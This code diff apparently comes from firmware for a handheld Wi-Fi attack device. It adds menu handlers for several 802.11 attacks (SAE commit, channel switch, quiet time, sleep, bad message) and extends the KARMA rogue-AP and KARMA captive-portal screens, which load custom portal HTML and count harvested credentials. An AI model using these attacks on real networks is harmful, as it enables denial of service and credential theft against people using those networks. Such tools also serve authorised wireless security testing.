+			else if (btn.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK)
+			{
+				wifi_ap_list_print(true);
+			}
+			else if (btn.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK)
+			{
+				wifi_ap_list_print(false);
+			}
+			else if (btn.event[BUTTON_OK_KP_ID] == BUTTON_EVENT_CLICK)
+			{
+				if (ap_list && ap_view_idx < ap_count)
+				{
+					wifi_raw_attack_run_ap(mode, title, &ap_list[ap_view_idx]);
+				}
+				wifi_ap_list_print(true);
+			}
+		}
+	}
+}
+
+void wifi_attack_sae_commit(void)
+{
+	wifi_raw_attack_target_ui(WIFI_RAW_ATK_SAE_COMMIT, "SAE COMMIT");
+}
+
+void wifi_attack_channel_switch(void)
+{
+	wifi_raw_attack_target_ui(WIFI_RAW_ATK_CHAN_SWITCH, "CHANNEL SWITCH");
+}
+
+void wifi_attack_quiet_time(void)
+{
+	wifi_raw_attack_target_ui(WIFI_RAW_ATK_QUIET_TIME, "QUIET TIME");
+}
+
+void wifi_attack_sleep(void)
+{
+	wifi_raw_attack_target_ui(WIFI_RAW_ATK_SLEEP, "SLEEP ATTACK");
+}
+
+void wifi_attack_bad_msg(void)
+{
+	wifi_raw_attack_target_ui(WIFI_RAW_ATK_BAD_MSG, "BAD MSG");
+}
+
 void wifi_attack_karma(void)
 {
 	S_M1_Buttons_Status btn;
@@ -3964,6 +5414,8 @@ void wifi_attack_karma(void)
 	uint32_t last_poll;
 	uint32_t elapsed;
 	uint32_t probes = 0;
+	uint32_t total_probes = 0;
+	uint8_t channel = 0;
 	int spi_ret;
 
 	ensure_esp32_ready();
@@ -4001,32 +5453,42 @@ void wifi_attack_karma(void)
 					memcpy(latest_ssid, &resp.payload[6], slen);
 					latest_ssid[slen] = '\0';
 				}
+				if (resp.payload_len >= 7 + slen)
+				{
+					channel = resp.payload[6 + slen];
+				}
+				if (resp.payload_len >= 9 + slen)
+				{
+					total_probes = (uint32_t)resp.payload[7 + slen] |
+						((uint32_t)resp.payload[8 + slen] << 8);
+				}
+				}
+				last_poll = now;
 			}
-			last_poll = now;
-		}
 
 		m1_u8g2_firstpage();
 		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
 		u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
-		u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, "KARMA");
+			u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, "KARMA");
 
-		u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
-		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START, "Probe-driven AP");
-		if (latest_ssid[0])
-		{
-			snprintf(ln, sizeof(ln), "%.24s", latest_ssid);
+			u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
+			if (latest_ssid[0])
+			{
+				snprintf(ln, sizeof(ln), "%.24s", latest_ssid);
+				u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START, ln);
+			}
+			else
+			{
+				u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START, "Waiting for probes...");
+			}
+			snprintf(ln, sizeof(ln), "Dir:%lu All:%lu",
+				(unsigned long)probes, (unsigned long)total_probes);
 			u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + SF_Y_STEP, ln);
-		}
-		else
-		{
-			u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + SF_Y_STEP, "Waiting for probes...");
-		}
-		snprintf(ln, sizeof(ln), "Probes:%lu", (unsigned long)probes);
-		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 2 * SF_Y_STEP, ln);
-		snprintf(ln, sizeof(ln), "Time: %lus", elapsed);
-		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 3 * SF_Y_STEP, ln);
-		u8g2_DrawStr(&m1_u8g2, 2, 63, "[BACK] Stop");
-		m1_u8g2_nextpage();
+			snprintf(ln, sizeof(ln), "CH:%u Time:%lus", channel, elapsed);
+			u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 2 * SF_Y_STEP, ln);
+			u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 3 * SF_Y_STEP, "Probe-driven AP");
+			u8g2_DrawStr(&m1_u8g2, 2, 63, "[BACK] Stop");
+			m1_u8g2_nextpage();
 
 		ret = xQueueReceive(main_q_hdl, &q_item, pdMS_TO_TICKS(500));
 		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
@@ -4058,9 +5520,21 @@ void wifi_attack_karma_portal(void)
 	uint32_t last_poll;
 	uint32_t elapsed;
 	uint32_t probes = 0;
+	uint32_t total_probes = 0;
+	uint8_t channel = 0;
 	int spi_ret;
 
+	wifi_portal_cfg_load();
 	ensure_esp32_ready();
+
+	if (wifi_portal_html_path[0] != '\0')
+	{
+		if (!wifi_portal_upload_html_path(wifi_portal_html_path,
+			wifi_portal_html_name, false))
+		{
+			wifi_show_message("Karma Portal", "Using built-in", "HTML load failed");
+		}
+	}
 
 	spi_ret = m1_esp32_simple_cmd(CMD_KARMA_PORTAL_START, &resp, SNIFF_CMD_TIMEOUT);
 	if (spi_ret != 0 || resp.status != RESP_OK)
@@ -4097,9 +5571,18 @@ void wifi_attack_karma_portal(void)
 					memcpy(latest_ssid, &resp.payload[6], slen);
 					latest_ssid[slen] = '\0';
 				}
-			}
-			ep_poll_creds();
-			last_poll = now;
+				if (resp.payload_len >= 7 + slen)
+				{
+					channel = resp.payload[6 + slen];
+				}
+				if (resp.payload_len >= 9 + slen)
+				{
+					total_probes = (uint32_t)resp.payload[7 + slen] |
+						((uint32_t)resp.payload[8 + slen] << 8);
+				}
+				}
+				ep_poll_creds();
+				last_poll = now;
 		}
 
 		m1_u8g2_firstpage();
@@ -4118,8 +5601,9 @@ void wifi_attack_karma_portal(void)
 			u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START, "Waiting for probes...");
 		}
 
-		snprintf(ln, sizeof(ln), "Probes:%lu Creds:%d", (unsigned long)probes, ep_cred_count);
-		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + SF_Y_STEP, ln);
+			snprintf(ln, sizeof(ln), "D:%lu A:%lu C:%d",
+				(unsigned long)probes, (unsigned long)total_probes, ep_cred_count);
+			u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + SF_Y_STEP, ln);
 
 		if (ep_cred_count > 0)
 		{
@@ -4133,8 +5617,8 @@ void wifi_attack_karma_portal(void)
 			u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 2 * SF_Y_STEP, "Portal active");
 		}
 
-		snprintf(ln, sizeof(ln), "Time:%lus", elapsed);
-		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 3 * SF_Y_STEP, ln);
+			snprintf(ln, sizeof(ln), "CH:%u Time:%lus", channel, elapsed);
+			u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 3 * SF_Y_STEP, ln);
 		u8g2_DrawStr(&m1_u8g2, 2, 63, "[BACK] Stop");
 		m1_u8g2_nextpage();
 
